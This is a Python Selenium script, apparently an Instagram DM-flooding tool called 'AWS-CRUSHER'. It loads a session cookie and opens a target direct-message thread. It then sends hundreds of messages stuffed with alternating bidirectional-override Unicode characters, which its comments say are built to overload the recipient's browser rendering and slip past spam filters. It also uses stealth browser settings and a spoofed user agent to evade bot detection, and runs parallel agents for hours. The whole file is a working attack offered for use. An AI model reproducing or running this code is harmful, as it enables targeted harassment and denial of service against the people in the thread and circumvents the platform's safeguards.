# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (AWS-CRUSHER V23)
# 📅 STATUS: AWS-TARGET-LOCK | 4-AGENT TOTAL | PROCESS-SATURATION

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# --- 4 AGENTS TOTAL CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.2, 0.5)    # ⚡ Faster but safe from shadow-drop
REST_AFTER_STRIKES = 100   
REST_DURATION = 5          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()
sys.stdout.reconfigure(encoding='utf-8')

def get_aws_crusher_payload():
    """Generates a payload that forces infinite layout recalculations."""
    u_id = random.randint(1000, 9999)
    # \u2060 = Word Joiner (Prevents line breaking)
    # \u2068 = First Strong Isolate (Forces new render tree branch)
    glue, iso, pop = "\u2060", "\u2068", "\u2069"
    
    header = f"👑 PRAVEER OWNS THE MATRIX 👑 [NODE_ID:{u_id}]"
    
    body = []
    # 280 lines of nested layout instructions
    for i in range(280):
        # We alternate BIDI direction (Right-to-Left / Left-to-Right)
        # This makes the browser's BiDi engine go into O(n^2) complexity.
        bidi = "\u202E" if i % 2 == 0 else "\u202D"
        # Masked with simple 'X O' to bypass server spam filters
        body.append(f"{iso}{bidi}X O {i} O X{pop}{glue}")
        
    return f"{header}\n{glue.join(body)}".strip()[:9995]

def log_status(agent_id, msg):
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    machine = os.environ.get('MACHINE_ID', '1')
    print(f"[{timestamp}] M-{machine} Agent {agent_id}: {msg}", flush=True)

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        
        # High-end desktop user agent to bypass 'Bot' security on AWS
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        temp_dir = os.path.join(tempfile.gettempdir(), f"node_{agent_id}_{int(time.time())}")
        chrome_options.add_argument(f"--user-data-dir={temp_dir}")
        driver = webdriver.Chrome(options=chrome_options)
        
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        driver.custom_temp_path = temp_dir
        return driver

def adaptive_send(driver, text):
    try:
        wait = WebDriverWait(driver, 25)
        box = wait.until(EC.presence_of_element_located((By.XPATH, "//div[@role='textbox'] | //textarea")))
        
        # Injection via JavaScript bypasses UI lag on the sender's end
        driver.execute_script("""
            var el = arguments[0];
            el.focus();
            document.execCommand('insertText', false, arguments[1]);
            el.dispatchEvent(new Event('input', { bubbles: true }));
        """, box, text)
        
        time.sleep(0.4)
        box.send_keys(Keys.ENTER)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    global_start = time.time()
    while (time.time() - global_start) < TOTAL_DURATION:
        driver = None
        strike_counter = 0
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            
            log_status(agent_id, "📡 Syncing AWS-Crusher...")
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(15) 
            
            if adaptive_send(driver, "🚀 AWS-CRUSHER MATRIX CONNECTED"):
                log_status(agent_id, "✅ Opponent Targeted.")

            while (time.time() - global_start) < TOTAL_DURATION:
                payload = get_aws_crusher_payload()
                if adaptive_send(driver, payload):
                    strike_counter += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    
                    if strike_counter % REST_AFTER_STRIKES == 0:
                        log_status(agent_id, "✅ 100 Strikes. Resting...")
                        time.sleep(REST_DURATION)
                    else:
                        log_status(agent_id, f"Delivered (Total: {GLOBAL_SENT})")
                        
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            if driver: driver.quit()
            time.sleep(5)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
